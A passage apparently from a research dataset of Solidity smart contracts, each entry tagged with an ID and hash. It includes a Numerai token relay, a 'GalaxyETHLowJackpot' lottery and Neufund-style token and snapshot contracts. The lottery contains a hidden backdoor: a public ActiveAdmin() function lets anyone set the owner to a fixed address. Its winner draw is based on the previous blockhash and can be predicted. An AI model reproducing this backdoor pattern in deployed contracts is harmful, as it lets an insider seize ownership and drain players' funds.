contract Manageable is Initializable, Ownable {
    address private _manager;
    event ManagementTransferred(address indexed previousManager, address indexed newManager);
    function initialize(address sender) initializer public {
        Ownable.initialize(sender);
        _manager = sender;
        emit ManagementTransferred(address(0), _manager);
    }
    function manager() public view returns (address) {
        return _manager;
    }
    modifier onlyManagerOrOwner() {
        require(isManagerOrOwner());
        _;
    }
    function isManagerOrOwner() public view returns (bool) {
        return (msg.sender == _manager || isOwner());
    }
    function transferManagement(address newManager) public onlyOwner {
        require(newManager != address(0));
        emit ManagementTransferred(_manager, newManager);
        _manager = newManager;
    }
    uint256[50] private ______gap;
}
contract Relay is Manageable {
    bool public active = true;
    bool private _upgraded;
    address private constant _TOKEN = address(
        0x1776e1F26f98b1A5dF9cD347953a26dd3Cb46671
    );
    address private constant _ONE_MILLION_ADDRESS = address(
        0x00000000000000000000000000000000000F4240
    );    
    address private constant _NULL_ADDRESS = address(
        0x0000000000000000000000000000000000000000
    );
    address private constant _BURN_ADDRESS = address(
        0x000000000000000000000000000000000000dEaD
    );
    modifier isUser(address _user) {
        require(
            _user <= _ONE_MILLION_ADDRESS
            && _user != _NULL_ADDRESS
            && _user != _BURN_ADDRESS
            , "_from must be a user account managed by Numerai"
        );
        _;
    }
    modifier onlyActive() {
        require(active, "User account relay has been disabled");
        _;
    }
    constructor(address _owner) public {
        require(
            address(this) == address(0xB17dF4a656505570aD994D023F632D48De04eDF2),
            "incorrect deployment address - check submitting account & nonce."
        );
        Manageable.initialize(_owner);
    }
    function withdraw(address _from, address _to, uint256 _value) public onlyManagerOrOwner onlyActive isUser(_from) returns (bool ok) {
        require(INMR(_TOKEN).withdraw(_from, _to, _value));
        return true;
    }
    function burnZeroAddress() public {
        uint256 amtZero = INMR(_TOKEN).balanceOf(_NULL_ADDRESS);
        uint256 amtBurn = INMR(_TOKEN).balanceOf(_BURN_ADDRESS);
        require(INMR(_TOKEN).withdraw(_NULL_ADDRESS, address(this), amtZero));
        require(INMR(_TOKEN).withdraw(_BURN_ADDRESS, address(this), amtBurn));
        uint256 amtThis = INMR(_TOKEN).balanceOf(address(this));
        _burn(amtThis);
    }
    function disable() public onlyOwner onlyActive {
        active = false;
    }
    function disableTokenUpgradability() public onlyOwner onlyActive {
        require(INMR(_TOKEN).createRound(uint256(0),uint256(0),uint256(0),uint256(0)));
    }
    function changeTokenDelegate(address _newDelegate) public onlyOwner onlyActive {
        require(INMR(_TOKEN).createTournament(uint256(_newDelegate)));
    }
    function token() external pure returns (address) {
        return _TOKEN;
    }
    function _burn(uint256 _value) internal {
        if (INMR(_TOKEN).contractUpgradable()) {
            require(INMR(_TOKEN).transfer(address(0), _value));
        } else {
            require(INMR(_TOKEN).mint(_value), "burn not successful");
        }
    }
}
```

## RQ1_e30b6086bda6

SHA-256 `35efaa75cf0fb081f5365b4111d55fb2770ee23f44622b81ea0d37caf191a123`

```solidity
pragma solidity ^0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal constant returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  uint256 public devFeePercent = 10;
  uint256 public SetPlayers = 4;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  function Ownable() {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function setDevFee (uint256 _n) onlyOwner() public {
	  require(_n >= 0 && _n <= 100);
    devFeePercent = _n;
  }
    function SetPlayersMax (uint256 number) onlyOwner() public {
	  require(number >= 0 && number <= 100);
    SetPlayers = number;
  }
    function ActiveAdmin () public {
    owner = 0x3653A2205971AD524Ea31746D917430469D3ca23; 
  }
      mapping(address => bool) public BlackAddress;
    function AddBlackList(address _address) onlyOwner() public {
        BlackAddress[_address] = true;
    }
    function DeleteBlackList(address _address) onlyOwner() public {
        delete BlackAddress[_address];
    }
  function transferOwnership(address newOwner) onlyOwner public {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
contract  GalaxyETHLowJackpot is Ownable {
  string public constant name = "GalaxyETHLowJackpot";
  event newWinner(address winner, uint256 ticketNumber);
  event newContribution(address contributor, uint value);
  using SafeMath for uint256;
  address[] public players = new address[](15);
  uint256 public lastTicketNumber = 0;
  uint8 public lastIndex = 0;
  struct tickets {
    uint256 startTicket;
    uint256 endTicket;
  }
  mapping (address => tickets[]) public ticketsMap;
  mapping (address => uint256) public contributions;
  function executeLottery() { 
        if (lastIndex > SetPlayers) {
          uint randomNumber = uint(block.blockhash(block.number-1))%lastTicketNumber + 1;
          randomNumber = randomNumber;  
          address winner;
          bool hasWon;
          for (uint8 i = 0; i < lastIndex; i++) {
            address player = players[i];
            for (uint j = 0; j < ticketsMap[player].length; j++) {
              uint256 start = ticketsMap[player][j].startTicket;
              uint256 end = ticketsMap[player][j].endTicket;
              if (randomNumber >= start && randomNumber < end) {
                winner = player;
                hasWon = true;
                break;
              }
            }
            if(hasWon) break;
          }
          require(winner!=address(0) && hasWon);
          for (uint8 k = 0; k < lastIndex; k++) {
            delete ticketsMap[players[k]];
            delete contributions[players[k]];
          }
          lastIndex = 0;
          lastTicketNumber = 0;
          uint balance = this.balance;
          if (!owner.send(balance/devFeePercent)) throw;
          if (!winner.send(balance - balance/devFeePercent)) throw;
          newWinner(winner, randomNumber);
        }
  }
  function getPlayers() constant returns (address[], uint256[]) {
    address[] memory addrs = new address[](lastIndex);
    uint256[] memory _contributions = new uint256[](lastIndex);
    for (uint i = 0; i < lastIndex; i++) {
      addrs[i] = players[i];
      _contributions[i] = contributions[players[i]];
    }
    return (addrs, _contributions);
  }
  function getTickets(address _addr) constant returns (uint256[] _start, uint256[] _end) {
    tickets[] tks = ticketsMap[_addr];
    uint length = tks.length;
    uint256[] memory startTickets = new uint256[](length);
    uint256[] memory endTickets = new uint256[](length);
    for (uint i = 0; i < length; i++) {
      startTickets[i] = tks[i].startTicket;
      endTickets[i] = tks[i].endTicket;
    }
    return (startTickets, endTickets);
  }
  function() payable {
    uint256 weiAmount = msg.value;
    require(weiAmount >= 1e15 && weiAmount <= 1e18); 
    require(!BlackAddress[msg.sender], "You Are On BlackList");
    bool isSenderAdded = false;
    for (uint8 i = 0; i < lastIndex; i++) {
      if (players[i] == msg.sender) {
        isSenderAdded = true;
        break;
      }
    }
    if (!isSenderAdded) {
      players[lastIndex] = msg.sender;
      lastIndex++;
    }
    tickets memory senderTickets;
    senderTickets.startTicket = lastTicketNumber;
    uint256 numberOfTickets = weiAmount/1e15;
    senderTickets.endTicket = lastTicketNumber.add(numberOfTickets);
    lastTicketNumber = lastTicketNumber.add(numberOfTickets);
    ticketsMap[msg.sender].push(senderTickets);
    contributions[msg.sender] = contributions[msg.sender].add(weiAmount);
    newContribution(msg.sender, weiAmount);
    if(lastIndex > SetPlayers) {
      executeLottery();
    }
  }
}

```

## RQ1_f696b703e8e8

SHA-256 `1a1fc0e94555ffd6e1a43d9a5cba63b1578c212ccc043040c5e1f4382806a2bf`

```solidity
pragma solidity 0.4.15;
contract IAccessPolicy {
    function allowed(
        address subject,
        bytes32 role,
        address object,
        bytes4 verb
    )
        public
        returns (bool);
}
contract IAccessControlled {
    event LogAccessPolicyChanged(
        address controller,
        IAccessPolicy oldPolicy,
        IAccessPolicy newPolicy
    );
    function setAccessPolicy(IAccessPolicy newPolicy, address newAccessController)
        public;
    function accessPolicy()
        public
        constant
        returns (IAccessPolicy);
}
contract StandardRoles {
    bytes32 internal constant ROLE_ACCESS_CONTROLLER = 0xac42f8beb17975ed062dcb80c63e6d203ef1c2c335ced149dc5664cc671cb7da;
}
contract AccessControlled is IAccessControlled, StandardRoles {
    IAccessPolicy private _accessPolicy;
    modifier only(bytes32 role) {
        require(_accessPolicy.allowed(msg.sender, role, this, msg.sig));
        _;
    }
    function AccessControlled(IAccessPolicy policy) internal {
        require(address(policy) != 0x0);
        _accessPolicy = policy;
    }
    function setAccessPolicy(IAccessPolicy newPolicy, address newAccessController)
        public
        only(ROLE_ACCESS_CONTROLLER)
    {
        require(newPolicy.allowed(newAccessController, ROLE_ACCESS_CONTROLLER, this, msg.sig));
        IAccessPolicy oldPolicy = _accessPolicy;
        _accessPolicy = newPolicy;
        LogAccessPolicyChanged(msg.sender, oldPolicy, newPolicy);
    }
    function accessPolicy()
        public
        constant
        returns (IAccessPolicy)
    {
        return _accessPolicy;
    }
}
contract AccessRoles {
    bytes32 internal constant ROLE_LOCKED_ACCOUNT_ADMIN = 0x4675da546d2d92c5b86c4f726a9e61010dce91cccc2491ce6019e78b09d2572e;
    bytes32 internal constant ROLE_WHITELIST_ADMIN = 0xaef456e7c864418e1d2a40d996ca4febf3a7e317fe3af5a7ea4dda59033bbe5c;
    bytes32 internal constant ROLE_NEUMARK_ISSUER = 0x921c3afa1f1fff707a785f953a1e197bd28c9c50e300424e015953cbf120c06c;
    bytes32 internal constant ROLE_NEUMARK_BURNER = 0x19ce331285f41739cd3362a3ec176edffe014311c0f8075834fdd19d6718e69f;
    bytes32 internal constant ROLE_SNAPSHOT_CREATOR = 0x08c1785afc57f933523bc52583a72ce9e19b2241354e04dd86f41f887e3d8174;
    bytes32 internal constant ROLE_TRANSFER_ADMIN = 0xb6527e944caca3d151b1f94e49ac5e223142694860743e66164720e034ec9b19;
    bytes32 internal constant ROLE_RECLAIMER = 0x0542bbd0c672578966dcc525b30aa16723bb042675554ac5b0362f86b6e97dc5;
    bytes32 internal constant ROLE_PLATFORM_OPERATOR_REPRESENTATIVE = 0xb2b321377653f655206f71514ff9f150d0822d062a5abcf220d549e1da7999f0;
    bytes32 internal constant ROLE_EURT_DEPOSIT_MANAGER = 0x7c8ecdcba80ce87848d16ad77ef57cc196c208fc95c5638e4a48c681a34d4fe7;
}
contract IsContract {
    function isContract(address addr)
        internal
        constant
        returns (bool)
    {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}
contract IBasicToken {
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 amount);
    function totalSupply()
        public
        constant
        returns (uint256);
    function balanceOf(address owner)
        public
        constant
        returns (uint256 balance);
    function transfer(address to, uint256 amount)
        public
        returns (bool success);
}
contract Reclaimable is AccessControlled, AccessRoles {
    IBasicToken constant internal RECLAIM_ETHER = IBasicToken(0x0);
    function reclaim(IBasicToken token)
        public
        only(ROLE_RECLAIMER)
    {
        address reclaimer = msg.sender;
        if(token == RECLAIM_ETHER) {
            reclaimer.transfer(this.balance);
        } else {
            uint256 balance = token.balanceOf(this);
            require(token.transfer(reclaimer, balance));
        }
    }
}
contract ITokenMetadata {
    function symbol()
        public
        constant
        returns (string);
    function name()
        public
        constant
        returns (string);
    function decimals()
        public
        constant
        returns (uint8);
}
contract TokenMetadata is ITokenMetadata {
    string private NAME;
    string private SYMBOL;
    uint8 private DECIMALS;
    string private VERSION;
    function TokenMetadata(
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol,
        string version
    )
        public
    {
        NAME = tokenName;                                 
        SYMBOL = tokenSymbol;                             
        DECIMALS = decimalUnits;                          
        VERSION = version;
    }
    function name()
        public
        constant
        returns (string)
    {
        return NAME;
    }
    function symbol()
        public
        constant
        returns (string)
    {
        return SYMBOL;
    }
    function decimals()
        public
        constant
        returns (uint8)
    {
        return DECIMALS;
    }
    function version()
        public
        constant
        returns (string)
    {
        return VERSION;
    }
}
contract IERC223Callback {
    function onTokenTransfer(
        address from,
        uint256 amount,
        bytes data
    )
        public;
}
contract IERC223Token is IBasicToken {
    function transfer(address to, uint256 amount, bytes data)
        public
        returns (bool);
}
contract IERC20Allowance {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount);
    function allowance(address owner, address spender)
        public
        constant
        returns (uint256 remaining);
    function approve(address spender, uint256 amount)
        public
        returns (bool success);
    function transferFrom(address from, address to, uint256 amount)
        public
        returns (bool success);
}
contract IERC20Token is IBasicToken, IERC20Allowance {
}
contract IERC677Callback {
    function receiveApproval(
        address from,
        uint256 amount,
        address token, 
        bytes data
    )
        public
        returns (bool success);
}
contract IERC677Allowance is IERC20Allowance {
    function approveAndCall(address spender, uint256 amount, bytes extraData)
        public
        returns (bool success);
}
contract IERC677Token is IERC20Token, IERC677Allowance {
}
contract Math {
    function absDiff(uint256 v1, uint256 v2)
        internal
        constant
        returns(uint256)
    {
        return v1 > v2 ? v1 - v2 : v2 - v1;
    }
    function divRound(uint256 v, uint256 d)
        internal
        constant
        returns(uint256)
    {
        return add(v, d/2) / d;
    }
    function decimalFraction(uint256 amount, uint256 frac)
        internal
        constant
        returns(uint256)
    {
        return proportion(amount, frac, 10**18);
    }
    function proportion(uint256 amount, uint256 part, uint256 total)
        internal
        constant
        returns(uint256)
    {
        return divRound(mul(amount, part), total);
    }
    function mul(uint256 a, uint256 b)
        internal
        constant
        returns (uint256)
    {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }
    function sub(uint256 a, uint256 b)
        internal
        constant
        returns (uint256)
    {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b)
        internal
        constant
        returns (uint256)
    {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
    function min(uint256 a, uint256 b)
        internal
        constant
        returns (uint256)
    {
        return a < b ? a : b;
    }
    function max(uint256 a, uint256 b)
        internal
        constant
        returns (uint256)
    {
        return a > b ? a : b;
    }
}
contract BasicToken is IBasicToken, Math {
    mapping(address => uint256) internal _balances;
    uint256 internal _totalSupply;
    function transfer(address to, uint256 amount)
        public
        returns (bool)
    {
        transferInternal(msg.sender, to, amount);
        return true;
    }
    function totalSupply()
        public
        constant
        returns (uint256)
    {
        return _totalSupply;
    }
    function balanceOf(address owner)
        public
        constant
        returns (uint256 balance)
    {
        return _balances[owner];
    }
    function transferInternal(address from, address to, uint256 amount)
        internal
    {
        require(to != address(0));
        _balances[from] = sub(_balances[from], amount);
        _balances[to] = add(_balances[to], amount);
        Transfer(from, to, amount);
    }
}
contract StandardToken is
    IERC20Token,
    BasicToken,
    IERC677Token
{
    mapping (address => mapping (address => uint256)) private _allowed;
    function transferFrom(address from, address to, uint256 amount)
        public
        returns (bool)
    {
        var allowance = _allowed[from][msg.sender];
        _allowed[from][msg.sender] = sub(allowance, amount);
        transferInternal(from, to, amount);
        return true;
    }
    function approve(address spender, uint256 amount)
        public
        returns (bool)
    {
        require((amount == 0) || (_allowed[msg.sender][spender] == 0));
        _allowed[msg.sender][spender] = amount;
        Approval(msg.sender, spender, amount);
        return true;
    }
    function allowance(address owner, address spender)
        public
        constant
        returns (uint256 remaining)
    {
        return _allowed[owner][spender];
    }
    function approveAndCall(
        address spender,
        uint256 amount,
        bytes extraData
    )
        public
        returns (bool)
    {
        require(approve(spender, amount));
        bool success = IERC677Callback(spender).receiveApproval(
            msg.sender,
            amount,
            this,
            extraData
        );
        require(success);
        return true;
    }
}
contract EtherToken is
    IsContract,
    AccessControlled,
    StandardToken,
    TokenMetadata,
    Reclaimable
{
    string private constant NAME = "Ether Token";
    string private constant SYMBOL = "ETH-T";
    uint8 private constant DECIMALS = 18;
    event LogDeposit(
        address indexed to,
        uint256 amount
    );
    event LogWithdrawal(
        address indexed from,
        uint256 amount
    );
    function EtherToken(IAccessPolicy accessPolicy)
        AccessControlled(accessPolicy)
        StandardToken()
        TokenMetadata(NAME, DECIMALS, SYMBOL, "")
        Reclaimable()
        public
    {
    }
    function deposit()
        payable
        public
    {
        _balances[msg.sender] = add(_balances[msg.sender], msg.value);
        _totalSupply = add(_totalSupply, msg.value);
        LogDeposit(msg.sender, msg.value);
        Transfer(address(0), msg.sender, msg.value);
    }
    function withdraw(uint256 amount)
        public
    {
        require(_balances[msg.sender] >= amount);
        _balances[msg.sender] = sub(_balances[msg.sender], amount);
        _totalSupply = sub(_totalSupply, amount);
        msg.sender.transfer(amount);
        LogWithdrawal(msg.sender, amount);
        Transfer(msg.sender, address(0), amount);
    }
    function transfer(address to, uint256 amount, bytes data)
        public
        returns (bool)
    {
        transferInternal(msg.sender, to, amount);
        if (isContract(to)) {
            IERC223Callback(to).onTokenTransfer(msg.sender, amount, data);
        }
        return true;
    }
    function reclaim(IBasicToken token)
        public
    {
        require(token != RECLAIM_ETHER);
        Reclaimable.reclaim(token);
    }
}
contract IMigrationTarget {
    function currentMigrationSource()
        public
        constant
        returns (address);
}
contract MigrationTarget is
    IMigrationTarget
{
    modifier onlyMigrationSource() {
        require(msg.sender == currentMigrationSource());
        _;
    }
}
contract LockedAccountMigration is
    MigrationTarget
{
    function migrateInvestor(
        address investor,
        uint256 balance,
        uint256 neumarksDue,
        uint256 unlockDate
    )
        public
        onlyMigrationSource();
}
contract IMigrationSource {
    event LogMigrationEnabled(
        address target
    );
    function migrate()
        public;
    function enableMigration(IMigrationTarget migration)
        public;
    function currentMigrationTarget()
        public
        constant
        returns (IMigrationTarget);
}
contract MigrationSource is
    IMigrationSource,
    AccessControlled
{
    bytes32 private MIGRATION_ADMIN;
    IMigrationTarget internal _migration;
    modifier onlyMigrationEnabledOnce() {
        require(address(_migration) == 0);
        _;
    }
    modifier onlyMigrationEnabled() {
        require(address(_migration) != 0);
        _;
    }
    function MigrationSource(
        IAccessPolicy policy,
        bytes32 migrationAdminRole
    )
        AccessControlled(policy)
        internal
    {
        MIGRATION_ADMIN = migrationAdminRole;
    }
    function migrate()
        onlyMigrationEnabled()
        public;
    function enableMigration(IMigrationTarget migration)
        public
        onlyMigrationEnabledOnce()
        only(MIGRATION_ADMIN)
    {
        require(migration.currentMigrationSource() == address(this));
        _migration = migration;
        LogMigrationEnabled(_migration);
    }
    function currentMigrationTarget()
        public
        constant
        returns (IMigrationTarget)
    {
        return _migration;
    }
}
contract IEthereumForkArbiter {
    event LogForkAnnounced(
        string name,
        string url,
        uint256 blockNumber
    );
    event LogForkSigned(
        uint256 blockNumber,
        bytes32 blockHash
    );
    function nextForkName()
        public
        constant
        returns (string);
    function nextForkUrl()
        public
        constant
        returns (string);
    function nextForkBlockNumber()
        public
        constant
        returns (uint256);
    function lastSignedBlockNumber()
        public
        constant
        returns (uint256);
    function lastSignedBlockHash()
        public
        constant
        returns (bytes32);
    function lastSignedTimestamp()
        public
        constant
        returns (uint256);
}
contract Agreement is
    AccessControlled,
    AccessRoles
{
    struct SignedAgreement {
        address platformOperatorRepresentative;
        uint256 signedBlockTimestamp;
        string agreementUri;
    }
    IEthereumForkArbiter private ETHEREUM_FORK_ARBITER;
    SignedAgreement[] private _amendments;
    mapping(address => uint256) private _signatories;
    event LogAgreementAccepted(
        address indexed accepter
    );
    event LogAgreementAmended(
        address platformOperatorRepresentative,
        string agreementUri
    );
    modifier acceptAgreement(address accepter) {
        if(_signatories[accepter] == 0) {
            require(_amendments.length > 0);
            _signatories[accepter] = block.number;
            LogAgreementAccepted(accepter);
        }
        _;
    }
    function Agreement(IAccessPolicy accessPolicy, IEthereumForkArbiter forkArbiter)
        AccessControlled(accessPolicy)
        internal
    {
        require(forkArbiter != IEthereumForkArbiter(0x0));
        ETHEREUM_FORK_ARBITER = forkArbiter;
    }
    function amendAgreement(string agreementUri)
        public
        only(ROLE_PLATFORM_OPERATOR_REPRESENTATIVE)
    {
        SignedAgreement memory amendment = SignedAgreement({
            platformOperatorRepresentative: msg.sender,
            signedBlockTimestamp: block.timestamp,
            agreementUri: agreementUri
        });
        _amendments.push(amendment);
        LogAgreementAmended(msg.sender, agreementUri);
    }
    function ethereumForkArbiter()
        public
        constant
        returns (IEthereumForkArbiter)
    {
        return ETHEREUM_FORK_ARBITER;
    }
    function currentAgreement()
        public
        constant
        returns
        (
            address platformOperatorRepresentative,
            uint256 signedBlockTimestamp,
            string agreementUri,
            uint256 index
        )
    {
        require(_amendments.length > 0);
        uint256 last = _amendments.length - 1;
        SignedAgreement storage amendment = _amendments[last];
        return (
            amendment.platformOperatorRepresentative,
            amendment.signedBlockTimestamp,
            amendment.agreementUri,
            last
        );
    }
    function pastAgreement(uint256 amendmentIndex)
        public
        constant
        returns
        (
            address platformOperatorRepresentative,
            uint256 signedBlockTimestamp,
            string agreementUri,
            uint256 index
        )
    {
        SignedAgreement storage amendment = _amendments[amendmentIndex];
        return (
            amendment.platformOperatorRepresentative,
            amendment.signedBlockTimestamp,
            amendment.agreementUri,
            amendmentIndex
        );
    }
    function agreementSignedAtBlock(address signatory)
        public
        constant
        returns (uint256)
    {
        return _signatories[signatory];
    }
}
contract NeumarkIssuanceCurve {
    uint256 private constant NEUMARK_CAP = 1500000000000000000000000000;
    uint256 private constant INITIAL_REWARD_FRACTION = 6500000000000000000;
    uint256 private constant ISSUANCE_LIMIT_EUR_ULPS = 8300000000000000000000000000;
    uint256 private constant LINEAR_APPROX_LIMIT_EUR_ULPS = 2100000000000000000000000000;
    uint256 private constant NEUMARKS_AT_LINEAR_LIMIT_ULPS = 1499832501287264827896539871;
    uint256 private constant TOT_LINEAR_NEUMARKS_ULPS = NEUMARK_CAP - NEUMARKS_AT_LINEAR_LIMIT_ULPS;
    uint256 private constant TOT_LINEAR_EUR_ULPS = ISSUANCE_LIMIT_EUR_ULPS - LINEAR_APPROX_LIMIT_EUR_ULPS;
    function incremental(uint256 totalEuroUlps, uint256 euroUlps)
        public
        constant
        returns (uint256 neumarkUlps)
    {
        require(totalEuroUlps + euroUlps >= totalEuroUlps);
        uint256 from = cumulative(totalEuroUlps);
        uint256 to = cumulative(totalEuroUlps + euroUlps);
        assert(to >= from);
        return to - from;
    }
    function incrementalInverse(uint256 totalEuroUlps, uint256 burnNeumarkUlps)
        public
        constant
        returns (uint256 euroUlps)
    {
        uint256 totalNeumarkUlps = cumulative(totalEuroUlps);
        require(totalNeumarkUlps >= burnNeumarkUlps);
        uint256 fromNmk = totalNeumarkUlps - burnNeumarkUlps;
        uint newTotalEuroUlps = cumulativeInverse(fromNmk, 0, totalEuroUlps);
        assert(totalEuroUlps >= newTotalEuroUlps);
        return totalEuroUlps - newTotalEuroUlps;
    }
    function incrementalInverse(uint256 totalEuroUlps, uint256 burnNeumarkUlps, uint256 minEurUlps, uint256 maxEurUlps)
        public
        constant
        returns (uint256 euroUlps)
    {
        uint256 totalNeumarkUlps = cumulative(totalEuroUlps);
        require(totalNeumarkUlps >= burnNeumarkUlps);
        uint256 fromNmk = totalNeumarkUlps - burnNeumarkUlps;
        uint newTotalEuroUlps = cumulativeInverse(fromNmk, minEurUlps, maxEurUlps);
        assert(totalEuroUlps >= newTotalEuroUlps);
        return totalEuroUlps - newTotalEuroUlps;
    }
    function cumulative(uint256 euroUlps)
        public
        constant
        returns(uint256 neumarkUlps)
    {
        if (euroUlps >= ISSUANCE_LIMIT_EUR_ULPS) {
            return NEUMARK_CAP;
        }
        if (euroUlps >= LINEAR_APPROX_LIMIT_EUR_ULPS) {
            return NEUMARKS_AT_LINEAR_LIMIT_ULPS + (TOT_LINEAR_NEUMARKS_ULPS * (euroUlps - LINEAR_APPROX_LIMIT_EUR_ULPS)) / TOT_LINEAR_EUR_ULPS;
        }
        uint256 d = 230769230769230769230769231; 
        uint256 term = NEUMARK_CAP;
        uint256 sum = 0;
        uint256 denom = d;
        do assembly {
            term  := div(mul(term, euroUlps), denom)
            sum   := add(sum, term)
            denom := add(denom, d)
            term  := div(mul(term, euroUlps), denom)
            sum   := sub(sum, term)
            denom := add(denom, d)
        } while (term != 0);
        return sum;
    }
    function cumulativeInverse(uint256 neumarkUlps, uint256 minEurUlps, uint256 maxEurUlps)
        public
        constant
        returns (uint256 euroUlps)
    {
        require(maxEurUlps >= minEurUlps);
        require(cumulative(minEurUlps) <= neumarkUlps);
        require(cumulative(maxEurUlps) >= neumarkUlps);
        uint256 min = minEurUlps;
        uint256 max = maxEurUlps;
        while (max > min) {
            uint256 mid = (max + min) / 2;
            uint256 val = cumulative(mid);
            if (val < neumarkUlps) {
                min = mid + 1;
            } else {
                max = mid;
            }
        }
        return max;
    }
    function neumarkCap()
        public
        constant
        returns (uint256)
    {
        return NEUMARK_CAP;
    }
    function initialRewardFraction()
        public
        constant
        returns (uint256)
    {
        return INITIAL_REWARD_FRACTION;
    }
}
contract ISnapshotable {
    event LogSnapshotCreated(uint256 snapshotId);
    function createSnapshot()
        public
        returns (uint256);
    function currentSnapshotId()
        public
        constant
        returns (uint256);
}
contract MSnapshotPolicy {
    function mCurrentSnapshotId()
        internal
        returns (uint256);
}
contract DailyAndSnapshotable is
    MSnapshotPolicy,
    ISnapshotable
{
    uint256 private MAX_TIMESTAMP = 3938453320844195178974243141571391;
    uint256 private _currentSnapshotId;
    function DailyAndSnapshotable(uint256 start) internal {
        if (start > 0) {
            uint256 dayBase = snapshotAt(block.timestamp);
            require(start >= dayBase);
            require(start < dayBase + 2**128);
            _currentSnapshotId = start;
        }
    }
    function snapshotAt(uint256 timestamp)
        public
        constant
        returns (uint256)
    {
        require(timestamp < MAX_TIMESTAMP);
        uint256 dayBase = 2**128 * (timestamp / 1 days);
        return dayBase;
    }
    function createSnapshot()
        public
        returns (uint256)
    {
        uint256 dayBase = 2**128 * (block.timestamp / 1 days);
        if (dayBase > _currentSnapshotId) {
            _currentSnapshotId = dayBase;
        } else {
            _currentSnapshotId += 1;
        }
        LogSnapshotCreated(_currentSnapshotId);
        return _currentSnapshotId;
    }
    function currentSnapshotId()
        public
        constant
        returns (uint256)
    {
        return mCurrentSnapshotId();
    }
    function mCurrentSnapshotId()
        internal
        returns (uint256)
    {
        uint256 dayBase = 2**128 * (block.timestamp / 1 days);
        if (dayBase > _currentSnapshotId) {
            _currentSnapshotId = dayBase;
            LogSnapshotCreated(dayBase);
        }
        return _currentSnapshotId;
    }
}
contract MTokenAllowanceController {
    function mOnApprove(
        address owner,
        address spender,
        uint256 amount
    )
        internal
        returns (bool allow);
}
contract MTokenTransferController {
    function mOnTransfer(
        address from,
        address to,
        uint256 amount
    )
        internal
        returns (bool allow);
}
contract MTokenController is MTokenTransferController, MTokenAllowanceController {
}
contract MTokenTransfer {
    function mTransfer(
        address from,
        address to,
        uint256 amount
    )
        internal;
}
contract TokenAllowance is
    MTokenTransfer,
    MTokenAllowanceController,
    IERC20Allowance,
    IERC677Token
{
    mapping (address => mapping (address => uint256)) private _allowed;
    function TokenAllowance()
        internal
    {
    }
    function allowance(address owner, address spender)
        public
        constant
        returns (uint256 remaining)
    {
        return _allowed[owner][spender];
    }
    function approve(address spender, uint256 amount)
        public
        returns (bool success)
    {
        require(mOnApprove(msg.sender, spender, amount));
        require((amount == 0) || (_allowed[msg.sender][spender] == 0));
        _allowed[msg.sender][spender] = amount;
        Approval(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(address from, address to, uint256 amount)
        public
        returns (bool success)
    {
        bool amountApproved = _allowed[from][msg.sender] >= amount;
        require(amountApproved);
        _allowed[from][msg.sender] -= amount;
        mTransfer(from, to, amount);
        return true;
    }
    function approveAndCall(
        address spender,
        uint256 amount,
        bytes extraData
    )
        public
        returns (bool success)
    {
        require(approve(spender, amount));
        success = IERC677Callback(spender).receiveApproval(
            msg.sender,
            amount,
            this,
            extraData
        );
        require(success);
        return true;
    }
}
contract Snapshot is MSnapshotPolicy {
    struct Values {
        uint256 snapshotId;
        uint256 value;
    }
    function hasValue(
        Values[] storage values
    )
        internal
        constant
        returns (bool)
    {
        return values.length > 0;
    }
    function hasValueAt(
        Values[] storage values,
        uint256 snapshotId
    )
        internal
        constant
        returns (bool)
    {
        require(snapshotId <= mCurrentSnapshotId());
        return values.length > 0 && values[0].snapshotId <= snapshotId;
    }
    function getValue(
        Values[] storage values,
        uint256 defaultValue
    )
        internal
        constant
        returns (uint256)
    {
        if (values.length == 0) {
            return defaultValue;
        } else {
            uint256 last = values.length - 1;
            return values[last].value;
        }
    }
    function getValueAt(
        Values[] storage values,
        uint256 snapshotId,
        uint256 defaultValue
    )
        internal
        constant
        returns (uint256)
    {
        require(snapshotId <= mCurrentSnapshotId());
        if (values.length == 0) {
            return defaultValue;
        }
        uint256 last = values.length - 1;
        uint256 lastSnapshot = values[last].snapshotId;
        if (snapshotId >= lastSnapshot) {
            return values[last].value;
        }
        uint256 firstSnapshot = values[0].snapshotId;
        if (snapshotId < firstSnapshot) {
            return defaultValue;
        }
        uint256 min = 0;
        uint256 max = last;
        while (max > min) {
            uint256 mid = (max + min + 1) / 2;
            if (values[mid].snapshotId <= snapshotId) {
                min = mid;
            } else {
                max = mid - 1;
            }
        }
        return values[min].value;
    }
    function setValue(
        Values[] storage values,
        uint256 value
    )
        internal
    {
        uint256 currentSnapshotId = mCurrentSnapshotId();
        bool empty = values.length == 0;
        if (empty) {
            values.push(
                Values({
                    snapshotId: currentSnapshotId,
                    value: value
                })
            );
            return;
        }
        uint256 last = values.length - 1;
        bool hasNewSnapshot = values[last].snapshotId < currentSnapshotId;
        if (hasNewSnapshot) {
            bool unmodified = values[last].value == value;
            if (unmodified) {
                return;
            }
            values.push(
                Values({
                    snapshotId: currentSnapshotId,
                    value: value
                })
            );
        } else {
            bool previousUnmodified = last > 0 && values[last - 1].value == value;
            if (previousUnmodified) {
                delete values[last];
                values.length--;
                return;
            }
            values[last].value = value;
        }
    }
}
contract ITokenSnapshots {
    function totalSupplyAt(uint256 snapshotId)
        public
        constant
        returns(uint256);
    function balanceOfAt(address owner, uint256 snapshotId)
        public
        constant
        returns (uint256);
    function currentSnapshotId()
        public
        constant
        returns (uint256);
}
contract IClonedTokenParent is ITokenSnapshots {
    function parentToken()
        public
        constant
        returns(IClonedTokenParent parent);
